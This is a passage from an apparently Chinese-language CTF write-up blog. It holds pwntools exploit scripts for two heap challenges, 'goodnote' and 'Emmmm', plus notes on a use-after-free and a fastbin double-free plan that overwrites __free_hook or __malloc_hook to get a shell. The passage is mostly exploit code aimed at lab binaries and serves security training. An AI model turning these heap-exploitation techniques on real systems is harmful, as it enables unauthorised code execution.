punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rn <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rud <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'DEBUG'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./goodnote'</span><span class="token punctuation">)</span>libc_offset <span class="token operator">=</span> <span class="token number">0x3c4b20</span>gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span><span class="token number">0x4526a</span><span class="token punctuation">,</span><span class="token number">0xf02a4</span><span class="token punctuation">,</span><span class="token number">0xf1147</span><span class="token punctuation">]</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./goodnote'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./x64_libc.so.6'</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'f.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">20173</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#leak libc</span>    Add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x120</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0</span>    Add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x120</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0</span>    Delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    Add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x120</span><span class="token punctuation">)</span>    Show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">96</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x10</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc base => "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#heap overflow</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>    Add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x4000000000000000</span><span class="token punctuation">)</span>    Add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span>    Delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x51</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span>    libc<span class="token punctuation">.</span>address <span class="token operator">=</span> libc_base    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xffffffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    Add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span>    Add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xffffffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x6e69622f</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x68732f</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    Delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Emmmm"><a href="#Emmmm" class="headerlink" title="Emmmm"></a>Emmmm</h1><h2 id="查看文件-3"><a href="#查看文件-3" class="headerlink" title="查看文件"></a>查看文件</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="en-resource://database/9819:1" alt="3f8cc3bb784efdd946f79ed3e26cec05.png"></p><h2 id="IDA分析-3"><a href="#IDA分析-3" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>主函数：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="en-resource://database/9821:1" alt="51afb70ca8677d1a5a43d802c47778ad.png">@w=600<br>create：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="en-resource://database/9824:1" alt="f02bbc129a2fa5715b0ab4aa240d2cd5.png">@w=600<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="en-resource://database/9818:1" alt="30c588f5665c6ac07ff5f095e8a8bdaa.png">@w=600</p><p>创建过程先创建 一个0x20的chunk作为manage，之前也常见的。其它的就一切照旧，分别是size、content等内容。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="en-resource://database/9822:1" alt="c1c98f7c0d60e40860d20f0a3335a4ee.png">@w=600<br>删除只删除0x20的chunk，不删除存放content的chunk。有一个UAF漏洞。注意还有个数量限制，所以我们需要注意 不能消耗太多的chunk，否则会导致最后chunk不够用，被坑过。</p><p>show函数并没有什么实在的用处。</p><h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><p>第一步：创建出c-&gt;a-&gt;b-&gt;a的chunk链，目的是伪造size。（首先将 fastbin链改到content位置，而该位置的fake chunk大小必须也是0x20，同时下面要紧挨着0x20的manage chunk，这样的话才可以改manage  chunk的size并且可以释放掉，改其它位置的chunk没有用）<br>第二步 ：利用上述操作 改一个大于fastbin的chunk来leak出libc<br>第三步：利用 第一步的格式来创造出两个0x70<br>第四步：改malloc_hook为realloc，realloc_hook改为one_gadget最后需要平衡栈帧。</p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>DEBUG <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> DEBUG<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span>xxx<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sea     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span>          <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span>rl      <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims              <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"Choice >>"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"Size:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"Note:"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"Choice >>"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"Index:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"Choice >>"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"Index:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># leak libc</span>create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">"\x22"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">"\x40"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 这是为了指向fake chunk的地址</span>create<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 这里 就可以改manage chunk原本0x20的size了</span>create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">"\x60"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">"will free: "</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token operator">-</span><span class="token number">88</span>success<span class="token punctuation">(</span><span class="token string">"libc address==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># create two 0x70 chunk</span>delete<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">"\x40"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">"\x70"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0xf1147</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">11</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0xf1147</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token 